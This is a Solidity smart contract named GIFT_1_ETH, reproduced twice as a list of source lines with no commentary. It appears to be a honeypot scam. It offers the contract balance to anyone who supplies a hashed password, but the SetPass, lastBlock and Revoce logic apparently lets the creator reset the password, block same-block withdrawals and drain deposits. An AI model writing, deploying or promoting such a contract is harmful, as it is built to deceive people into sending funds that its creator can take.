['pragma solidity ^0.4.19;\n', '\n', 'contract GIFT_1_ETH\n', '{\n', '    bytes32 public hashPass;\n', '    \n', '    address sender;\n', '\t\n', '\tbool passHasBeenSet = false;\n', '\t\n', '\tuint lastBlock;\n', '\t\n', '\tfunction() public payable{}\n', '    \n', '    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}\n', '    \n', '    function SetPass(bytes32 hash)\n', '    public\n', '    payable\n', '    {\n', '        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )\n', '        {\n', '            hashPass = hash;\n', '            sender = msg.sender;\n', '        }\n', '        lastBlock = block.number;\n', '    }\n', '    \n', '    function GetGift(bytes pass)\n', '    external\n', '    payable\n', '    oneforblock\n', '    {\n', '        if(hashPass == keccak256(pass))\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function Revoce()\n', '    public\n', '    payable\n', '    oneforblock\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function PassHasBeenSet(bytes32 hash)\n', '    public\n', '    {\n', '        if(msg.sender==sender&&hash==hashPass)\n', '        {\n', '           passHasBeenSet=true;\n', '        }\n', '    }\n', '    \n', '    modifier oneforblock\n', '    {\n', '        require(lastBlock<block.number);\n', '        _;\n', '    }\n', '    \n', '}']
['pragma solidity ^0.4.19;\n', '\n', 'contract GIFT_1_ETH\n', '{\n', '    bytes32 public hashPass;\n', '    \n', '    address sender;\n', '\t\n', '\tbool passHasBeenSet = false;\n', '\t\n', '\tuint lastBlock;\n', '\t\n', '\tfunction() public payable{}\n', '    \n', '    function GetHash(bytes pass) public constant returns (bytes32) {return keccak256(pass);}\n', '    \n', '    function SetPass(bytes32 hash)\n', '    public\n', '    payable\n', '    {\n', '        if( (!passHasBeenSet&&(msg.value > 1 ether)) || hashPass==0x0 )\n', '        {\n', '            hashPass = hash;\n', '            sender = msg.sender;\n', '        }\n', '        lastBlock = block.number;\n', '    }\n', '    \n', '    function GetGift(bytes pass)\n', '    external\n', '    payable\n', '    oneforblock\n', '    {\n', '        if(hashPass == keccak256(pass))\n', '        {\n', '            msg.sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function Revoce()\n', '    public\n', '    payable\n', '    oneforblock\n', '    {\n', '        if(msg.sender==sender)\n', '        {\n', '            sender.transfer(this.balance);\n', '        }\n', '    }\n', '    \n', '    function PassHasBeenSet(bytes32 hash)\n', '    public\n', '    {\n', '        if(msg.sender==sender&&hash==hashPass)\n', '        {\n', '           passHasBeenSet=true;\n', '        }\n', '    }\n', '    \n', '    modifier oneforblock\n', '    {\n', '        require(lastBlock<block.number);\n', '        _;\n', '    }\n', '    \n', '}']
